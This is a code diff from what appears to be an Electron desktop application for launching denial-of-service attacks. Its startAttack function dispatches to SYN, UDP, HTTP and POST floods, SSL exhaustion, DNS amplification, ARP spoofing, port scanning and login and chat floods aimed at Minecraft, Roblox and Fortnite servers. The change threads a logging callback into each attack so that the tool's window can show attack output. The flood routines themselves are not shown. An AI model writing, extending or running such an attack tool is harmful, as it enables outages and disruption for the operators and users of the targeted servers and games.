@@ -59,54 +59,59 @@ function startAttack(target, attackType, rateLimit) {
     const http = require('http');
     const https = require('https');
 
+    function logOutput(message) {
+        const mainWindow = BrowserWindow.getAllWindows()[0];
+        mainWindow.webContents.send('attack-output', message);
+    }
+
     switch (attackType) {
         case 'syn':
-            synFlood(target, rateLimit);
+            synFlood(target, rateLimit, logOutput);
             break;
         case 'udp':
-            udpFlood(target, rateLimit);
+            udpFlood(target, rateLimit, logOutput);
             break;
         case 'http':
-            httpFlood(target, rateLimit);
+            httpFlood(target, rateLimit, logOutput);
             break;
         case 'https':
-            httpsFlood(target, rateLimit);
+            httpsFlood(target, rateLimit, logOutput);
             break;
         case 'post':
-            postFlood(target, rateLimit);
+            postFlood(target, rateLimit, logOutput);
             break;
         case 'ssl_exhaustion':
-            sslExhaustion(target, rateLimit);
+            sslExhaustion(target, rateLimit, logOutput);
             break;
         case 'minecraft_login':
-            minecraftLoginFlood(target, rateLimit);
+            minecraftLoginFlood(target, rateLimit, logOutput);
             break;
         case 'minecraft_chat':
-            minecraftChatFlood(target, rateLimit);
+            minecraftChatFlood(target, rateLimit, logOutput);
             break;
         case 'roblox_login':
-            robloxLoginFlood(target, rateLimit);
+            robloxLoginFlood(target, rateLimit, logOutput);
             break;
         case 'roblox_chat':
-            robloxChatFlood(target, rateLimit);
+            robloxChatFlood(target, rateLimit, logOutput);
             break;
         case 'fortnite_login':
-            fortniteLoginFlood(target, rateLimit);
+            fortniteLoginFlood(target, rateLimit, logOutput);
             break;
         case 'fortnite_chat':
-            fortniteChatFlood(target, rateLimit);
+            fortniteChatFlood(target, rateLimit, logOutput);
             break;
         case 'icmp':
-            icmpFlood(target, rateLimit);
+            icmpFlood(target, rateLimit, logOutput);
             break;
         case 'dns_amplification':
-            dnsAmplification(target, rateLimit);
+            dnsAmplification(target, rateLimit, logOutput);
             break;
         case 'port_scan':
-            portScan(target, rateLimit);
+            portScan(target, rateLimit, logOutput);
             break;
         case 'arp_spoofing':
-            arpSpoofing(target, rateLimit);
+            arpSpoofing(target, rateLimit, logOutput);
             break;
         default:
             console.error('Invalid attack type');
